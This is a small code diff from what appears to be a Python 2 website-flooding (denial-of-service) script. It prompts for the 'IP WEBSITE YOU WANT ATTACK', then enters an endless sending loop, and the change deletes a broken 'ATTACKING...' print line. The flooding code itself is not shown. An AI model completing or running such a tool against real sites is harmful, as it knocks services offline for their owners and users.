@@ -25,7 +25,6 @@ def logo():
 
 ip = raw_input("[+] >>IP WEBSITE YOU WANT ATTACK: ")
 os.system("clear")
-print (ATTACKING...)
 time.sleep(3)
 while True:
 	sent = 0
